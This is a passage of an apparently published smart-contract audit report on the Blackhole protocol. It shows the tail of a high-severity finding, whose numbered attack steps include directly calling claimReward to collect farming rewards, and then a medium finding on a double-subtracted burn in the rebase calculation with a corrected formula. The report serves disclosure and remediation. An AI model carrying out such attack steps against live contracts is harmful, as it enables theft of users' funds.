class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eDeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"11\"\u003e\n\u003cli\u003eAttacker directly calls the \u003ccode\u003eAlgebraEternalFarming.claimReward\u003c/code\u003e function to claim the rewards \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/FarmingCenter.sol#L119\"\u003ehere\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @inheritdoc IAlgebraEternalFarming\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_claimReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_claimReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimToZeroAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emapping\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunchecked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferHelper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRewardClaimed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountRequested\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole commented:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBlackhole Protocol disputes the classification of this issue as high severity, noting that the protocol is designed to deposit no more than \u003ccode\u003e$0.10\u003c/code\u003e worth of BLACK tokens, an amount sufficient to spawn over a million liquidity pools on Blackhole.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-6\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-53\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"medium-risk-findings-13\" style=\"position:relative;\"\u003e\u003ca href=\"#medium-risk-findings-13\" aria-label=\"medium risk findings 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (13)\u003c/h1\u003e\n\u003ch2 id=\"m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment\" style=\"position:relative;\"\u003e\u003ca href=\"#m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment\" aria-label=\"m 01 minterupgradeable double subtracting smnft burns causes rebase underpayment permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-16\"\u003e[M-01] \u003ccode\u003eMinterUpgradeable\u003c/code\u003e: double-subtracting smNFT burns causes rebase underpayment\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-17\"\u003elonelybones\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-9\"\u003eAkxai\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-383\"\u003ecodexNature\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-417\"\u003ehakunamatata\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-252\"\u003eholtzzx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L297\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L297\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eRoot Cause:\u003c/strong\u003e Incorrect \u003ccode\u003ecirculatingBlack\u003c/code\u003e calculation in \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e function (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L132\"\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol#L132\u003c/code\u003e\u003c/a\u003e) incorrectly calculates \u003ccode\u003ecirculatingBlack\u003c/code\u003e when Supermassive NFTs (smNFTs) are present.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003esmNFT Creation Burns \u003ccode\u003eBLACK\u003c/code\u003e:\u003c/strong\u003e \u003ccode\u003eBLACK\u003c/code\u003e tokens are burned when smNFTs are created/augmented in \u003ccode\u003eVotingEscrow.sol\u003c/code\u003e (e.g., \u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L796\"\u003e\u003ccode\u003econtracts/VotingEscrow.sol#L796\u003c/code\u003e\u003c/a\u003e, \u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L933\"\u003e\u003ccode\u003e#L933\u003c/code\u003e\u003c/a\u003e). This correctly reduces \u003ccode\u003eBLACK.totalSupply()\u003c/code\u003e (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/Black.sol#L97\"\u003e\u003ccode\u003econtracts/Black.sol#L97\u003c/code\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e_blackTotal\u003c/code\u003e is Post-Burn Supply:\u003c/strong\u003e \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e reads this already-reduced \u003ccode\u003etotalSupply\u003c/code\u003e into \u003ccode\u003e_blackTotal\u003c/code\u003e (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L127\"\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol#L127\u003c/code\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDouble Subtraction Flaw:\u003c/strong\u003e The calculation for \u003ccode\u003ecirculatingBlack\u003c/code\u003e effectively becomes \u003ccode\u003e_blackTotal - _veTotal - _smNFTBalance\u003c/code\u003e. Since \u003ccode\u003e_blackTotal\u003c/code\u003e is already net of the burned \u003ccode\u003e_smNFTBalance\u003c/code\u003e, \u003ccode\u003e_smNFTBalance\u003c/code\u003e is erroneously subtracted twice.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eMisallocation of minted emissions (high severity): this double-subtraction results in an artificially low \u003ccode\u003ecirculatingBlack\u003c/code\u003e value. The rebase formula (\u003ccode\u003eRebase ~ _weeklyMint * (circulatingBlack / blackSupply)^2 / 2\u003c/code\u003e) is highly sensitive to this error.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eUnderstated Rebase:\u003c/strong\u003e The \u003ccode\u003erebaseAmount\u003c/code\u003e paid to \u003ccode\u003eRewardsDistributor\u003c/code\u003e (for LPs/stakers) is significantly lower than intended.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOverstated Gauge Emissions:\u003c/strong\u003e Consequently, emissions allocated to gauges (\u003ccode\u003e_gauge = _emission - _rebase - _teamEmissions\u003c/code\u003e) are significantly overstated.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEconomic Imbalance:\u003c/strong\u003e This systematically diverts value from LPs/stakers to \u003ccode\u003eveBLACK\u003c/code\u003e voters who direct gauge emissions, undermining the protocol’s economic model. The misallocation is persistent and scales with the total \u003ccode\u003e_smNFTBalance\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe Proof of Concept demonstrates this flaw, leading to a tangible misdirection of emissions each epoch. This directly affects a new core feature (smNFTs) and critical system logic.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eCorrect the \u003ccode\u003ecirculatingBlack\u003c/code\u003e calculation in \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L132\"\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol#L132\u003c/code\u003e\u003c/a\u003e).\u003c/p\u003e\n\u003cp\u003eGiven \u003ccode\u003e_blackTotal = _black.totalSupply()\u003c/code\u003e (already reduced by smNFT burns) and \u003ccode\u003e_veTotal = _black.balanceOf(address(_ve))\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCorrected \u003ccode\u003ecirculatingBlack\u003c/code\u003e calculation:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In MinterUpgradeable.calculate_rebase()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecirculatingBlack_corrected\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_blackTotal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_veTotal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis ensures \u003ccode\u003e_smNFTBalance\u003c/code\u003e (representing tokens already removed from \u003ccode\u003e_blackTotal\u003c/code\u003e) is not subtracted again. The blackSupply denominator (\u003ccode\u003e_blackTotal + _superMassiveBonus\u003c/code\u003e) can remain, as it reflects an effective total 